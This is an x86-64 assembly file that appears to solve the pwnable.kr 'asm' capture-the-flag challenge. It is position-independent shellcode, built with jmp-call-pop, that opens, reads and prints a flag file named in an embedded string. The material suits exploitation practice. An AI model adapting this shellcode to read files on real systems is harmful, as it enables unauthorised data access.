; nasm -f elf64 open_read_file.asm
; ld -m elf_x86_64 open_read_file.o -o open_read_file

BITS 64

global _start

section .text

_start:
	jmp a

b:
	pop rdi
	push rdi
	push rdi
	mov rsi, 4
	mov rdx, 0
	mov rax, 2
	syscall
	
	mov rdi, rax
	xor rax, rax
	pop rsi
	mov rdx, 10000
	syscall
	
	mov rax, 1
	mov rdi, 1
	pop rsi
	mov rdx, 10000
	syscall
	
	mov rax, 0x3c
	xor rdi, rdi
	syscall

a:
	call b

db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"